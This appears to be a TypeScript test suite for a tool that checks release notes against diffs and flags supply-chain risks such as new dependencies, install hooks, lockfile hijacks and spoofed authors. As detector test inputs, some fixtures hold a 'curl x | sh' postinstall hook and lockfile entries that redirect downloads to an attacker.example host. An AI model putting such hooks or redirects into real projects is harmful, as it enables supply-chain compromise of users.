// SPDX-License-Identifier: GPL-3.0-or-later
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  sensitiveCategory,
  newDependencies,
  opacityIssue,
  computeScores,
  isSourceFile,
  isSourcelessDiff,
  classifyUnverifiable,
  demoteUnsupportedFlag,
  buildFlags,
  baselineFlags,
  lockfileSources,
} from "../src/metrics.ts";
import { layoutTreemap } from "../src/html.ts";
import type { ClaimResult, DiffFile, FileInsight, ReleaseData, RiskFlag } from "../src/types.ts";
import type { Baseline } from "../src/history.ts";
import type { Coverage } from "../src/verify.ts";

test("sensitiveCategory classifies by priority", () => {
  assert.equal(sensitiveCategory("Cargo.toml"), "dependencies");
  assert.equal(sensitiveCategory(".github/workflows/release.yml"), "ci/build");
  assert.equal(sensitiveCategory("docker/Dockerfile.debian"), "ci/build");
  assert.equal(sensitiveCategory("src/auth/session.rs"), "auth/crypto");
  assert.equal(sensitiveCategory("src/api/icons.rs"), null);
  assert.equal(sensitiveCategory("README.md"), null);
  // Documents about auth/policy are not auth code.
  assert.equal(sensitiveCategory("AUTHORS.md"), null);
  assert.equal(sensitiveCategory("AI_POLICY.md"), null);
  assert.equal(sensitiveCategory("docs/oauth-setup.rst"), null);
  // Docs under CI directories are not CI config either (.github/CONTRIBUTING.md
  // flagged as ci/build in the watchdog corpus) — but real workflows stay.
  assert.equal(sensitiveCategory(".github/CONTRIBUTING.md"), null);
  assert.equal(sensitiveCategory(".github/SECURITY.md"), null);
  assert.equal(sensitiveCategory(".github/workflows/ci.yml"), "ci/build");
  assert.equal(sensitiveCategory("setup.py"), "ci/build");
  // Neither are test files that mention auth in their path.
  assert.equal(sensitiveCategory("caddytest/integration/forwardauth_test.go"), null);
  assert.equal(sensitiveCategory("src/auth/session_test.go"), null);
  assert.equal(sensitiveCategory("web/__tests__/login.spec.ts"), null);
  assert.equal(sensitiveCategory("src/auth/session.go"), "auth/crypto");
});

function file(path: string, patch: string): DiffFile {
  const additions = patch.split("\n").filter((l) => l.startsWith("+")).length;
  return { path, status: "modified", additions, deletions: 0, patch };
}

test("newDependencies finds added deps, ignores version bumps and lockfiles", () => {
  const added = file(
    "Cargo.toml",
    '@@ -1,2 +1,3 @@\n serde = "1.0"\n+sneaky-crate = "0.1.3"\n',
  );
  assert.deepEqual(newDependencies(added), ["sneaky-crate"]);

  const bumped = file("Cargo.toml", '@@ -1,1 +1,1 @@\n-serde = "1.0.1"\n+serde = "1.0.2"\n');
  assert.deepEqual(newDependencies(bumped), []);

  const lock = file("Cargo.lock", '@@ -1,1 +1,2 @@\n+name = "whatever"\n');
  assert.deepEqual(newDependencies(lock), []);

  // go.mod bumps use "name vX.Y.Z" (no = or :) — must not read as new.
  const goBump = file(
    "go.mod",
    "@@ -22,1 +22,1 @@ require (\n-\tgithub.com/klauspost/compress v1.18.4\n+\tgithub.com/klauspost/compress v1.18.6\n",
  );
  assert.deepEqual(newDependencies(goBump), []);

  const goNew = file("go.mod", "@@ -22,0 +23,1 @@ require (\n+\tgithub.com/evil/backdoor v1.0.0\n");
  assert.deepEqual(newDependencies(goNew), ["github.com/evil/backdoor"]);

  const pkg = file("package.json", '@@ -5,1 +5,2 @@\n   "dependencies": {\n+    "evil-pkg": "^2.0.0",\n');
  assert.deepEqual(newDependencies(pkg), ["evil-pkg"]);
});

test("newDependencies reads package.json blocks, not top-level metadata", () => {
  // Whole-file diff (e.g. a first release): meta keys and scripts have
  // version-looking values but are not dependencies.
  const wholeFile = file(
    "package.json",
    [
      "@@ -0,0 +1,14 @@",
      "+{",
      '+  "name": "demo",',
      '+  "version": "0.1.0",',
      '+  "license": "GPL-3.0-or-later",',
      '+  "packageManager": "pnpm@11.13.0",',
      '+  "engines": {',
      '+    "node": ">=24"',
      "+  },",
      '+  "scripts": {',
      '+    "build": "vite build --base=/v2/"',
      "+  },",
      '+  "devDependencies": {',
      '+    "typescript": "^7.0.2"',
      "+  }",
      "+}",
      "",
    ].join("\n"),
  );
  assert.deepEqual(newDependencies(wholeFile), ["typescript"]);

  // Small hunk without the block opener in context: versioned lines count,
  // minus the well-known top-level keys.
  const noOpener = file(
    "package.json",
    '@@ -12,2 +12,3 @@\n     "left-pad": "^1.3.0",\n+    "lodash": "^4.17.21",\n     "ms": "^2.1.3",\n',
  );
  assert.deepEqual(newDependencies(noOpener), ["lodash"]);
});

test("newDependencies reads Cargo sections, not [package] metadata", () => {
  // zed: a new crate in the workspace. Every key here looks like a dependency
  // line, and "version" fired a critical new-dependency flag.
  const newCrate = file(
    "crates/path/Cargo.toml",
    [
      "@@ -0,0 +1,12 @@",
      "+[package]",
      '+name = "path"',
      '+version = "0.1.0"',
      "+edition.workspace = true",
      '+license = "GPL-3.0-or-later"',
      "+",
      "+[lints]",
      "+workspace = true",
      "+",
      "+[dependencies]",
      "+anyhow.workspace = true",
      "+serde = { workspace = true, optional = true }",
      '+dunce = "1.0"',
      "",
    ].join("\n"),
  );
  // Only the directly versioned one is a new supplier: `.workspace = true`
  // points at the root manifest's existing declaration.
  assert.deepEqual(newDependencies(newCrate), ["dunce"]);

  // [dependencies.serde] names the dependency in the header.
  const tableForm = file(
    "Cargo.toml",
    '@@ -10,0 +11,3 @@\n+[dependencies.serde]\n+version = "1.0"\n+features = ["derive"]\n',
  );
  assert.deepEqual(newDependencies(tableForm), ["serde"]);
});

test("newDependencies ignores the project's own modules and same-supplier lines", () => {
  // traefik: a local module wired with `replace … => ./pkg/...`, a submodule of
  // a dependency already present, and a major bump — all flagged as new
  // suppliers before, all routine.
  const goMod = file(
    "go.mod",
    [
      "@@ -20,4 +20,8 @@ require (",
      " \tsigs.k8s.io/gateway-api v1.5.1",
      " \tgithub.com/go-acme/lego/v4 v4.35.2",
      "+\tgithub.com/traefik/traefik/dynamic/ext v0.0.0-00010101000000-000000000000",
      "+\tsigs.k8s.io/gateway-api/conformance v1.5.1",
      "+\tgithub.com/go-acme/lego/v5 v5.2.2",
      "+\tgithub.com/tufanbarisyildirim/gonginx v0.0.0-20250620092546-c3e307e36701",
      "",
    ].join("\n"),
  );
  // Only the genuinely new supplier survives.
  assert.deepEqual(newDependencies(goMod, "traefik/traefik"), [
    "github.com/tufanbarisyildirim/gonginx",
  ]);

  // Without the repo label the self-module cannot be recognised by name — the
  // same-supplier rule must not swallow it silently, it is simply still listed.
  assert.ok(
    newDependencies(goMod).includes("github.com/traefik/traefik/dynamic/ext"),
    "self-module needs the repo label to be recognised",
  );
});

test("opacityIssue flags binaries, minified blobs and install hooks", () => {
  assert.equal(
    opacityIssue({ path: "vendor/blob.so", status: "added", additions: 0, deletions: 0 }),
    "binary file",
  );
  assert.equal(
    opacityIssue({ path: "logo.png", status: "added", additions: 0, deletions: 0 }),
    null,
  );
  assert.equal(
    opacityIssue(file("dist/app.js", "@@ -0,0 +1,1 @@\n+" + "x".repeat(900))),
    "minified content",
  );
  assert.equal(
    opacityIssue(file("package.json", '@@ -3,1 +3,2 @@\n+  "postinstall": "curl x | sh",\n')),
    "install hook changed",
  );
});

function result(verdict: ClaimResult["verdict"], generated = false): ClaimResult {
  return {
    claim: { id: 0, section: "s", text: "t", kind: "change", prNumbers: [], shas: [], advisories: [], codeSpans: [] },
    verdict,
    confidence: 1,
    evidence: { commitShas: [], files: [], matchedTerms: [], methods: ["none"] },
    reasoning: "",
    judged: false,
    generated,
  };
}

test("computeScores caps overall on contradicted claims and critical flags", () => {
  const clean = computeScores([result("verified"), result("verified")], 1, []);
  assert.equal(clean.overall >= 85, true);
  assert.equal(clean.label, "solid");

  const contradicted = computeScores([result("verified"), result("contradicted")], 1, []);
  assert.ok(contradicted.overall <= 35, `expected cap, got ${contradicted.overall}`);
  assert.equal(contradicted.label, "suspicious");

  const critical: RiskFlag = { severity: "critical", kind: "x", message: "m", files: [], commitShas: [] };
  const flagged = computeScores([result("verified")], 1, [critical]);
  assert.ok(flagged.overall <= 45);
});

test("computeScores down-weights auto-generated entries", () => {
  // 1 failing handwritten claim among 3 verified generated ones must hurt more
  // than the raw 3/4 average.
  const s = computeScores(
    [result("verified", true), result("verified", true), result("verified", true), result("no-evidence")],
    1,
    [],
  );
  assert.ok(s.correctness < 50, `expected heavy penalty, got ${s.correctness}`);
});

test("isSourceFile separates reviewable code from docs and metadata", () => {
  for (const path of [
    "src/cli.ts",
    "Cargo.toml",
    ".github/workflows/ci.yml",
    "migrations/2026/up.sql",
    "config/app.xml",
    "Dockerfile",
  ]) {
    assert.equal(isSourceFile(path), true, path);
  }
  for (const path of [
    "CHANGELOG.md",
    "changelogs/unreleased/fix.yaml",
    "docs/install.rst",
    "README.md",
    "feed.xml",
    "site/atom.xml",
    "LICENSE",
    "LICENSE.txt",
    "AUTHORS",
    "docs/screenshot.png",
  ]) {
    assert.equal(isSourceFile(path), false, path);
  }
});

test("isSourcelessDiff flags docs-only diffs, not diffs with any code", () => {
  const diff = (...paths: string[]): DiffFile[] =>
    paths.map((path) => ({ path, status: "modified", additions: 1, deletions: 1 }));

  // anthropics/claude-code v2.1.219 → v2.1.220 shape: notes published without
  // the source they describe.
  assert.equal(isSourcelessDiff(diff("CHANGELOG.md", "feed.xml")), true);
  assert.equal(isSourcelessDiff(diff("README.md")), true);
  assert.equal(isSourcelessDiff(diff("CHANGELOG.md", "src/api.ts")), false);
  assert.equal(isSourcelessDiff(diff("package.json")), false);
});

test("computeScores does not score unverifiable claims as false", () => {
  const claims = [result("no-evidence"), result("no-evidence")];
  // Normal diff: nothing supported the claims — that is a correctness failure.
  assert.equal(computeScores(claims, 0, []).correctness, 0);
  assert.equal(computeScores(claims, 0, []).label, "suspicious");

  // Unverifiable: the claims could not be checked at all, so they must not
  // drag correctness to the level of a fabricated release — but the label must
  // not swing to a clean bill of health either.
  const sourceless = computeScores(claims, 0, [], true);
  assert.equal(sourceless.correctness, 100);
  assert.equal(sourceless.label, "unverified");
  assert.ok(sourceless.overall <= 65);

  // Nothing was asserted at all — that is genuinely fine, not "unverified".
  assert.equal(computeScores([], 1, [], true).label, "solid");

  // A claim that *was* checkable still counts — but while others drop out of
  // the ratio, the release reads as unverified, never as a clean bill.
  const mixed = computeScores([result("verified"), result("no-evidence")], 1, [], true);
  assert.equal(mixed.correctness, 100);
  assert.equal(mixed.label, "unverified");
  assert.ok(mixed.overall <= 65, `capped, got ${mixed.overall}`);
  assert.equal(computeScores([result("verified"), result("no-evidence")], 1, []).correctness, 50);
});

function releaseData(paths: string[]): ReleaseData {
  return {
    repoLabel: "zen-browser/desktop",
    baseRef: "1.0.0",
    headRef: "1.1.0",
    notes: "",
    commits: [],
    files: paths.map((path) => ({ path, status: "modified", additions: 5, deletions: 2 })),
    commitFiles: async () => [],
    warnings: [],
  };
}

function baselineOf(medianLexicalCoverage: number, releases = 5): Baseline {
  return {
    snapshots: Array.from({ length: releases }, () => ({}) as never),
    medianChurn: 100,
    medianLexicalCoverage,
    knownAuthors: [],
    knownLogins: [],
    everBinary: false,
  };
}

test("baselineFlags: the email key matches authors across sources", () => {
  // The truncation-fallback scenario: commits carry git names (clone) while
  // the baseline snapshots carry identity keys built from API data. The
  // git-header email is the one identity both sources share.
  const data = releaseData(["src/auth/login.ts"]);
  data.commits = [
    {
      sha: "abc1234",
      subject: "tighten session check",
      body: "",
      author: "Jane Doe",
      email: "Jane@Example.com",
      prNumbers: [],
    },
  ];
  const coverage: Coverage = {
    uncovered: [],
    coveredShas: new Set(),
    evidenceFiles: new Set(),
    commitFiles: new Map([
      ["abc1234", [{ path: "src/auth/login.ts", status: "modified", additions: 5, deletions: 2 }]],
    ]),
    mergeShas: new Set(),
  };
  const authorFlag = (knownAuthors: string[]) => {
    const base = baselineOf(0.5);
    base.knownAuthors = knownAuthors;
    return baselineFlags(data, coverage, base).find((f) => f.kind === "new-author-sensitive");
  };

  // Known by email (case-insensitive): "Jane Doe" the login never matched,
  // the email does — no first-time-author alarm.
  assert.equal(authorFlag(["jane@example.com"]), undefined);
  // A pre-email snapshot may still know the display name — also no alarm.
  assert.equal(authorFlag(["Jane Doe"]), undefined);
  // Genuinely unseen author on a sensitive path: a real warn.
  assert.equal(authorFlag(["someone-else@example.com"])?.severity, "warn");
});

test("baselineFlags: a known email with no known forge account is the spoofing signature", () => {
  const sensitiveFiles = [
    { path: "src/auth/login.ts", status: "modified", additions: 5, deletions: 2 },
  ];
  const coverage: Coverage = {
    uncovered: [],
    coveredShas: new Set(),
    evidenceFiles: new Set(),
    commitFiles: new Map([["abc1234", sensitiveFiles]]),
    mergeShas: new Set(),
  };
  const commit = (login: string | null | undefined) => ({
    sha: "abc1234",
    subject: "tighten session check",
    body: "",
    author: login ?? "Jane Doe",
    email: "jane@example.com",
    login,
    prNumbers: [],
  });
  const spoofFlag = (login: string | null | undefined, knownLogins: string[]) => {
    const data = releaseData([]);
    data.commits = [commit(login)];
    const base = baselineOf(0.5);
    base.knownAuthors = ["jane@example.com"];
    base.knownLogins = knownLogins;
    const flags = baselineFlags(data, coverage, base);
    return flags.find((f) => f.kind === "author-email-spoof");
  };

  // API source, email known, but the forge maps it to no account at all —
  // the email is forgeable, the missing attribution is the tell.
  assert.equal(spoofFlag(null, ["janedoe"])?.severity, "warn");
  // Attributed to an account the baseline never saw: same signature.
  assert.equal(spoofFlag("attacker", ["janedoe"])?.severity, "warn");
  // The account the baseline knows — a genuine pass, no flag.
  assert.equal(spoofFlag("janedoe", ["janedoe"]), undefined);
  // Clone source (no attribution exists): the check cannot apply.
  assert.equal(spoofFlag(undefined, ["janedoe"]), undefined);
  // Clone-built baseline (no logins known): nothing to compare against.
  assert.equal(spoofFlag(null, []), undefined);

  // Off sensitive paths the forged email stays quiet, like new-author-sensitive.
  const data = releaseData([]);
  data.commits = [commit(null)];
  const base = baselineOf(0.5);
  base.knownAuthors = ["jane@example.com"];
  base.knownLogins = ["janedoe"];
  const docsCoverage: Coverage = {
    ...coverage,
    commitFiles: new Map([
      ["abc1234", [{ path: "docs/notes.md", status: "modified", additions: 5, deletions: 2 }]],
    ]),
  };
  assert.equal(
    baselineFlags(data, docsCoverage, base).find((f) => f.kind === "author-email-spoof"),
    undefined,
  );
});

test("classifyUnverifiable: a docs-only diff needs no history", () => {
  const u = classifyUnverifiable(releaseData(["CHANGELOG.md", "feed.xml"]), [], [], null);
  assert.equal(u?.kind, "sourceless");
});

test("classifyUnverifiable: out-of-repo needs the repo's own history to agree", () => {
  // A fork: real code in the diff, but the notes describe upstream features.
  const fork = releaseData(["src/browser.ts", "config/prefs.js"]);
  const missing = [result("no-evidence"), result("no-evidence"), result("no-evidence")];

  assert.equal(classifyUnverifiable(fork, missing, [], baselineOf(0.05))?.kind, "out-of-repo");

  // Same release, but this repo normally anchors its claims in its own code —
  // then a release where the claims stop matching is a finding, not a shape.
  assert.equal(classifyUnverifiable(fork, missing, [], baselineOf(0.8)), null);
  // Too little history to call it a pattern.
  assert.equal(classifyUnverifiable(fork, missing, [], baselineOf(0.05, 2)), null);
  assert.equal(classifyUnverifiable(fork, missing, [], null), null);
  // Most claims DID match — nothing to explain away.
  assert.equal(
    classifyUnverifiable(fork, [result("verified"), result("no-evidence")], [], baselineOf(0.05)),
    null,
  );
  // A bare majority is not enough either. Measured on zen-browser 1.21.9b:
  // the same tag produced 5 and then 6 misses out of 10 on two runs, so a bar
  // at one half decides this repo's label by coin flip.
  const tenClaims = (misses: number) => [
    ...Array.from({ length: misses }, () => result("no-evidence")),
    ...Array.from({ length: 10 - misses }, () => result("verified")),
  ];
  assert.equal(classifyUnverifiable(fork, tenClaims(6), [], baselineOf(0.05)), null);
  assert.equal(classifyUnverifiable(fork, tenClaims(7), [], baselineOf(0.05))?.kind, "out-of-repo");
});

test("classifyUnverifiable: evidence about this release outranks the pattern", () => {
  const fork = releaseData(["src/browser.ts"]);
  const missing = [result("no-evidence"), result("no-evidence")];
  const base = baselineOf(0.05);
  assert.equal(classifyUnverifiable(fork, missing, [], base)?.kind, "out-of-repo");

  // A contradicted claim is proof the notes disagree with the diff — no repo
  // shape excuses that.
  assert.equal(
    classifyUnverifiable(fork, [...missing, result("contradicted")], [], base),
    null,
  );
  const critical: RiskFlag = {
    severity: "critical",
    kind: "undocumented-sensitive",
    message: "m",
    files: [],
    commitShas: [],
  };
  assert.equal(classifyUnverifiable(fork, missing, [critical], base), null);
});

test("demoteUnsupportedFlag turns the warn into an info, only when explained", () => {
  const flags: RiskFlag[] = [
    { severity: "warn", kind: "unsupported-claim", message: "2 claim(s) with no supporting evidence in the diff", files: [], commitShas: [] },
    { severity: "warn", kind: "undocumented-sensitive", message: "keep me", files: [], commitShas: [] },
  ];
  assert.deepEqual(demoteUnsupportedFlag(flags, null), flags);

  const demoted = demoteUnsupportedFlag(flags, { kind: "sourceless", reason: "r" });
  assert.equal(demoted[0].severity, "info");
  assert.equal(demoted[0].kind, "not-verifiable");
  assert.match(demoted[0].message, /not checkable against this repo's diff/);
  assert.deepEqual(demoted[1], flags[1]);
});

test("layoutTreemap fills the viewport and preserves area proportions", () => {
  const files: FileInsight[] = [
    { path: "a", churn: 600, sensitive: null, coverage: "evidence" },
    { path: "b", churn: 300, sensitive: null, coverage: "covered" },
    { path: "c", churn: 100, sensitive: null, coverage: "undocumented" },
  ];
  const rects = layoutTreemap(files, 1000, 500);
  assert.equal(rects.length, 3);
  const total = rects.reduce((s, r) => s + r.w * r.h, 0);
  assert.ok(Math.abs(total - 500_000) < 1, `area sum ${total}`);
  const a = rects.find((r) => r.file.path === "a")!;
  assert.ok(Math.abs(a.w * a.h - 300_000) < 1);
});

test("an undocumented auth path is critical only where the notes are otherwise complete", () => {
  const files: FileInsight[] = [
    { path: "src/auth/session.go", churn: 40, sensitive: "auth/crypto", coverage: "undocumented" },
  ];
  const data = releaseData(["src/auth/session.go"]);
  const sev = (ratio: number | null) =>
    buildFlags(data, [], null, files, ratio).find((f) => f.kind === "undocumented-sensitive")
      ?.severity;

  // The attack signature: notes read as a full account, the auth change is
  // the one thing missing.
  assert.equal(sev(0.95), "critical");
  // traefik (9% documented) and zed (50%): at that size some undocumented
  // sensitive path is near-certain — the completeness gap is the finding.
  assert.equal(sev(0.09), "warn");
  assert.equal(sev(0.5), "warn");
  // No reverse check ran — no basis to downgrade.
  assert.equal(sev(null), "critical");
});

test("machinery is source however its file is spelled", () => {
  // requirements.txt ends in .txt and decides what runs on the next install;
  // an SVG is markup that can carry <script>. Both used to make a release
  // "sourceless", which waives the correctness ratio and the no-evidence gate.
  for (const path of ["requirements.txt", "requirements-dev.txt", "assets/logo.svg"]) {
    assert.equal(isSourceFile(path), true, path);
  }
  assert.equal(isSourcelessDiff([
    { path: "requirements.txt", status: "modified", additions: 1, deletions: 0 },
    { path: "CHANGELOG.md", status: "modified", additions: 3, deletions: 0 },
  ]), false);
  // Project metadata is still not code — and no longer "auth/crypto" either.
  assert.equal(sensitiveCategory("AUTHORS"), null);
  assert.equal(sensitiveCategory("CONTRIBUTORS"), null);
  assert.equal(sensitiveCategory("requirements.txt"), "dependencies");
});

test("a critical finding outranks 'nothing here could be checked'", () => {
  const data = releaseData(["docs/guide.md", "CHANGELOG.md"]);
  const claims = [result("no-evidence")];
  assert.equal(
    classifyUnverifiable(data, claims, [], null)?.kind,
    "sourceless",
    "a genuine docs-only release still gets the carve-out",
  );
  const critical: RiskFlag[] = [
    { severity: "critical", kind: "new-dependency", message: "new dependency", files: [], commitShas: [] },
  ];
  assert.equal(
    classifyUnverifiable(data, claims, critical, null),
    null,
    "but not once this release itself tripped a critical flag",
  );
  assert.equal(
    classifyUnverifiable(data, [result("contradicted")], [], null),
    null,
    "nor when a claim is contradicted",
  );
});

test("an unprovable security claim is never excused by the repo's history", () => {
  const data = releaseData(["src/app.js"]);
  const baseline = {
    snapshots: [0.1, 0.1, 0.2].map((lexicalCoverage) => ({
      tag: "x", base: "y", date: null, commits: 1, files: 1, additions: 5, deletions: 5,
      claims: 1, anchoredCoverage: 0.1, lexicalCoverage, sensitiveTouched: [], binaries: 0,
      newDeps: [], authors: [],
    })),
    medianChurn: 10,
    medianLexicalCoverage: 0.1,
    knownAuthors: [],
    knownLogins: [],
    everBinary: false,
  };
  const routine = [result("no-evidence"), result("no-evidence"), result("no-evidence")];
  assert.equal(classifyUnverifiable(data, routine, [], baseline)?.kind, "out-of-repo");

  const security = [...routine];
  security[0] = { ...security[0], claim: { ...security[0].claim, section: "Security fixes" } };
  assert.equal(classifyUnverifiable(data, security, [], baseline), null);
});

test("a judge that could not answer is a finding, not silence", () => {
  // The fallback the failure lands on is the milder reading by construction,
  // so "the engine never answered" must not be quietly better for a release
  // than an answer. It was only ever visible inside the reasoning string.
  const failed: ClaimResult = {
    ...result("partial"),
    judgeFailed: true,
    reasoning: "commit abc is in the release range, but … (LLM judge failed: rate limited)",
  };
  const flags = buildFlags(releaseData(["src/app.js"]), [failed], null, [], null);
  const flag = flags.find((f) => f.kind === "judge-unavailable");
  assert.ok(flag, `expected a judge-unavailable flag, got ${flags.map((f) => f.kind).join(",")}`);
  assert.equal(flag!.severity, "warn");
  assert.match(flag!.message, /rate limited/);

  // A run where every judge call succeeded says nothing.
  assert.equal(
    buildFlags(releaseData(["src/app.js"]), [result("partial")], null, [], null)
      .some((f) => f.kind === "judge-unavailable"),
    false,
  );
});

test("a resolution hijack in a lockfile is not invisible", () => {
  // newDependencies() skips lockfiles on purpose — the names there restate
  // the manifest's. But a hijack does not change a name: the manifest keeps
  // asking for an ordinary package and the lockfile redirects the download.
  const lock: DiffFile = {
    path: "pnpm-lock.yaml", status: "modified", additions: 2, deletions: 0,
    patch:
      "@@ -10,6 +10,8 @@ packages:\n" +
      "+  /left-pad@1.0.0:\n" +
      "+    resolution: {tarball: https://cdn.attacker.example/left-pad.tgz}\n",
  };
  assert.deepEqual(newDependencies(lock, "victim/app"), [], "still not a name change");
  assert.deepEqual(lockfileSources(lock), ["https://cdn.attacker.example/left-pad.tgz"]);

  // Ordinary registry churn and Cargo's own index stay quiet.
  assert.deepEqual(
    lockfileSources({
      path: "package-lock.json", status: "modified", additions: 1, deletions: 0,
      patch: '@@ -1,2 +1,3 @@\n+      "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz",\n',
    }),
    [],
  );
  assert.deepEqual(
    lockfileSources({
      path: "Cargo.lock", status: "modified", additions: 1, deletions: 0,
      patch: '@@ -1,2 +1,3 @@\n+source = "registry+https://github.com/rust-lang/crates.io-index"\n',
    }),
    [],
  );
  // git/ssh/file references are never a registry release.
  assert.deepEqual(
    lockfileSources({
      path: "package-lock.json", status: "modified", additions: 1, deletions: 0,
      patch: '@@ -1,2 +1,3 @@\n+      "resolved": "git+ssh://git@github.com/evil/pkg.git#abc",\n',
    }),
    ["git+ssh://git@github.com/evil/pkg.git#abc"],
  );
  // …unless it carries the resolved commit. Vendoring a forked crate by rev
  // is ordinary, the content cannot change under you, and flagging it cost
  // cjpais/Handy v0.9.4 ten risk points on one of its own repositories.
  assert.deepEqual(
    lockfileSources({
      path: "src-tauri/Cargo.lock", status: "modified", additions: 1, deletions: 0,
      patch:
        '@@ -1,2 +1,3 @@\n+source = "git+https://github.com/cjpais/tao?rev=c3bee28c1d446d95f08c95c3b6f8d4bde052b876#c3bee28c1d446d95f08c95c3b6f8d4bde052b876"\n',
    }),
    [],
  );
  // A moving ref on the same host still is one: that content can change
  // after review, which is the whole shape this flag exists for.
  assert.deepEqual(
    lockfileSources({
      path: "src-tauri/Cargo.lock", status: "modified", additions: 1, deletions: 0,
      patch: '@@ -1,2 +1,3 @@\n+source = "git+https://github.com/cjpais/tao?branch=main"\n',
    }),
    ["git+https://github.com/cjpais/tao?branch=main"],
  );
  // Nor does a short rev pin anything — it is a prefix, not the content.
  assert.deepEqual(
    lockfileSources({
      path: "package-lock.json", status: "modified", additions: 1, deletions: 0,
      patch: '@@ -1,2 +1,3 @@\n+      "resolved": "git+https://github.com/evil/pkg.git#c3bee28",\n',
    }),
    ["git+https://github.com/evil/pkg.git#c3bee28"],
  );
  // And a tarball is not made safe by a sha-shaped query parameter.
  assert.deepEqual(
    lockfileSources({
      path: "package-lock.json", status: "modified", additions: 1, deletions: 0,
      patch:
        '@@ -1,2 +1,3 @@\n+      "resolved": "https://cdn.attacker.example/pkg.tgz?v=c3bee28c1d446d95f08c95c3b6f8d4bde052b876",\n',
    }),
    ["https://cdn.attacker.example/pkg.tgz?v=c3bee28c1d446d95f08c95c3b6f8d4bde052b876"],
  );
  // A URL in ordinary source code is not this check's business.
  assert.deepEqual(
    lockfileSources({
      path: "src/app.js", status: "modified", additions: 1, deletions: 0,
      patch: '@@ -1,2 +1,3 @@\n+fetch("https://cdn.attacker.example/x")\n',
    }),
    [],
  );

  const flags = buildFlags(
    { ...releaseData([]), files: [lock] },
    [],
    null,
    [{ path: "pnpm-lock.yaml", churn: 2, sensitive: "dependencies", coverage: "undocumented" }],
    1,
  );
  const flag = flags.find((f) => f.kind === "lockfile-source");
  assert.ok(flag, `expected a lockfile-source flag, got ${flags.map((f) => f.kind).join(",")}`);
  assert.equal(flag!.severity, "critical", "undocumented is critical, as for a new dependency");
});

test("tokenizer paths are not auth/crypto", () => {
  // Every parser/LLM repo has these; a substring "token" match flagged them
  // sensitive and triggered escalation reviews for nothing.
  assert.equal(sensitiveCategory("src/tokenizer.rs"), null);
  assert.equal(sensitiveCategory("lib/tokenize.py"), null);
  assert.equal(sensitiveCategory("nlp/detokenizer.go"), null);
  // Real token handling stays sensitive.
  assert.equal(sensitiveCategory("src/auth/token_store.rs"), "auth/crypto");
  assert.equal(sensitiveCategory("cmd/tokens.go"), "auth/crypto");
  assert.equal(sensitiveCategory("app/api_token.ts"), "auth/crypto");
});
